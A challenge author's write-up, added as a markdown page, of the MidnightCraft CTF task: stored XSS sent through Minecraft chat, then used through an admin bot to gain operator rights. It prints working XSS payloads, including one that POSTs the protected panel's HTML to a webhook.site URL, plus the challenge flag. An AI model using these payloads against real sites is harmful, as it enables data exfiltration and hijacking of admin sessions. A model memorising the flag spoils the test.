@@ -1,0 +1,180 @@
+---
+year: 2025
+title: 'MidnightCraft — CTF Challenge (XSS via Minecraft Chat)'
+htmlTitle: 'MidnightCraft — CTF\nXSS via Minecraft Chat'
+description: 'CTF challenge authored for Midnight Flag CTF 2025. Stored XSS injected through Minecraft chat → Python Flask admin bot exploitation → indirect /op (flag). 8 solves out of 600 teams.'
+heroImage: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?q=80&w=2832&auto=format&fit=crop'
+heroImageAlign: 'center'
+universe: 'security'
+tags:
+  - CTF Challenge Design
+  - XSS Stored
+  - Admin Bot
+  - Python Flask
+  - Flask-SocketIO
+  - MCRcon
+  - Minecraft
+  - WebSocket
+  - Web Security
+---
+
+## Context
+
+**Event**: Midnight Flag CTF 2025  
+**Author**: BIEN_SUR (Sylvain Costes)  
+**Category**: Misc / Web  
+**Solves**: 8 / 600 teams · 484 pts  
+**Writeup by participants**: [alanoo.dev — MidnightCraft writeup](https://alanoo.dev/writeups/midnightflag-2025/midnightcraft) (alanoo & wii)
+
+MidnightCraft bridges two worlds: a custom Minecraft game server and an authenticated web admin panel. The objective: obtain **operator privileges** on the Minecraft server in order to run `/flag` — a custom command added by the `MidnightFlagCTF` plugin that outputs the flag only to ops.
+
+---
+
+## Challenge Setup
+
+Players connect to a Minecraft server running a custom plugin called **MidnightFlagCTF**. The plugin exposes two commands: `/discord` (harmless) and `/flag` (requires operator — the goal). The plugin also relays the in-game chat to a public showcase website in real time via **WebSocket**.
+
+The website has two key surfaces:
+- A **public chat feed** showing Minecraft messages as they come in
+- A **login-protected admin panel** (`/panel`) with a Minecraft server console — a text input that sends commands directly to the server
+
+There is also a **"Report abusive behaviour"** button on the public page. Its client-side handler calls `GET /report`, which triggers a Python bot to open the `/panel` page as an authenticated admin and "review" the latest messages.
+
+Participants guessed the bot was Playwright based on the `py-mctf` deploy tag — the actual stack is **Flask + Flask-SocketIO**, with **MCRcon** to relay commands to the Minecraft server.
+
+---
+
+## The Attack Chain
+
+```
+[Player types in Minecraft chat]
+            │
+            │  Java plugin relays message via WebSocket (no sanitization)
+            ▼
+[Public website renders message as HTML]
+            │
+            │  Stored XSS payload executes when bot visits /panel
+            ▼
+[Playwright bot opens /panel — authenticated admin session]
+            │
+            │  XSS payload interacts with console input (#cmd / #cmd_btn)
+            ▼
+[Bot sends "/op [playername]" to the Minecraft server]
+            │
+            ▼
+[Player is now operator → runs /flag → gets the flag]
+```
+
+---
+
+## Step 1 — Confirming XSS in the Chat Feed
+
+The Minecraft chat is rendered on the website without sanitization. Injecting an `<img>` tag with an `onerror` handler through the in-game chat confirms execution:
+
+```
+<img src=x onerror="alert(1)">
+```
+
+A simpler `<script>` tag did not work (scripts injected via innerHTML are not executed by browsers), but the `<img onerror>` vector fired immediately when the page rendered the message.
+
+---
+
+## Step 2 — Recon: Dumping the Admin Panel HTML
+
+With XSS confirmed, the next step is to understand what the `/panel` page looks like — since it's login-protected and inaccessible directly. The bot visits `/panel` in an authenticated context, so any XSS payload typed in the Minecraft chat will execute there.
+
+The recon payload (sent via in-game chat):
+
+```html
+<img src=x onerror="
+  window.setInterval(function(){
+    fetch('/panel')
+      .then(r => r.text())
+      .then(html => fetch('https://webhook.site/[token]', {
+        method: 'POST',
+        body: html
+      }))
+  }, 5000)
+">
+```
+
+Click "Report abusive behaviour" → the bot opens `/panel` → XSS fires → the full panel HTML lands on the webhook. The relevant portion returned:
+
+```html
+<div class="main-content">
+  <h2 class="console-header">Console</h2>
+  <div id="chatBox" class="chat-box">
+    <!-- server log lines rendered here -->
+  </div>
+  <div class="mt-3 flex">
+    <input type="text" id="cmd" class="input-field"
+           placeholder="Send a command..." x-model="command">
+    <button id="cmd_btn" class="send-button" type="submit">Envoyer</button>
+  </div>
+  <div id="commandResponse" class="command-response"></div>
+</div>
+```
+
+The panel uses **Alpine.js** and exposes a text input (`#cmd`) wired to a send button (`#cmd_btn`). This is a direct Minecraft server console — typing `/op playername` and clicking the button would op that player.
+
+---
+
+## Step 3 — Final Payload: /op via the Bot
+
+With the panel structure known, the final payload fills the console input and clicks the button — all from inside the bot's authenticated browser session:
+
+```html
+<img src=x onerror="
+  document.getElementById('cmd').value='/op [playername]';
+  document.getElementById('cmd_btn').click()
+">
+```
+
+Send this as a Minecraft chat message, click "Report abusive behaviour" — the bot visits `/panel`, the XSS fires, the command executes. The player is now op on the server.
+
+Running `/flag` returns:
+
+```
+MCTF{209eea248a86815d157c618dd8ef0f14}
+```
+
+---
+
+## Why This Challenge Works as a CTF
+
+The challenge chains four distinct concepts that rarely appear together:
+
+1. **Injection vector is a game client, not a browser** — the XSS enters through in-game Minecraft chat, not a web form
+2. **Stored XSS with delayed execution** — the payload sits in the chat feed until the bot loads `/panel`
+3. **The bot provides the privilege escalation** — without the authenticated admin bot, the XSS is useless
+4. **Indirect command execution** — the attacker never talks to the server directly; they puppet an admin's browser
+
+**8 solves out of 600 teams** reflects that difficulty: players had to recognize the bot as the exploitation primitive, recon the protected panel, and chain three steps correctly.
+
+---
+
+## Actual Backend Stack
+
+The web application behind the challenge is a Python **Flask** app:
+
+- **Flask-SocketIO** — real-time WebSocket bridge between the Minecraft plugin and the public chat feed
+- **MCRcon** — sends RCON commands to the Minecraft server when the admin console is used (this is how `/op` actually lands)
+- **SQLite** — single `users` table with parameterized queries (no SQLi, that wasn't the intended path)
+- **Authentication** — MD5-hashed passwords (intentionally weak — but the login page wasn't the attack surface)
+
+The `/report` route triggers the bot (a separate Python script) to open `/panel` as the admin. Because the session cookie is set with `HTTPOnly`, JavaScript can't read it — but it doesn't need to. The XSS runs *inside* the bot's browser, so the same-origin fetch to `/panel` or the button click carries the session automatically.
+
+The `cmd_btn` click in the final payload triggers a fetch to the Flask backend, which proxies the command through **MCRcon** to the Minecraft server — that's the actual RCE primitive.
+
+---
+
+## Design Challenges
+
+Building a CTF challenge is harder than solving one. The main constraints here:
+
+- **The vulnerability must be discoverable but not trivial**: a raw `innerHTML` sink hidden behind WebSocket delivery buys time without being unfair
+- **Single intended path**: multiple XSS vectors were tested during authoring to ensure the `<img onerror>` route was the only reliable one
+- **Stability under concurrent load**: the challenge was deployed for 600 teams; the Playwright bot timing had to be predictable without being exploitable by race conditions
+- **Reproducible Docker setup**: Minecraft server + Java plugin + Python bot + web app, all composable in under 60 seconds
+
+The custom Minecraft build (the spawn area) was a deliberate choice — giving the challenge a visual identity and making participants feel the thematic connection between both surfaces before they even started solving it.
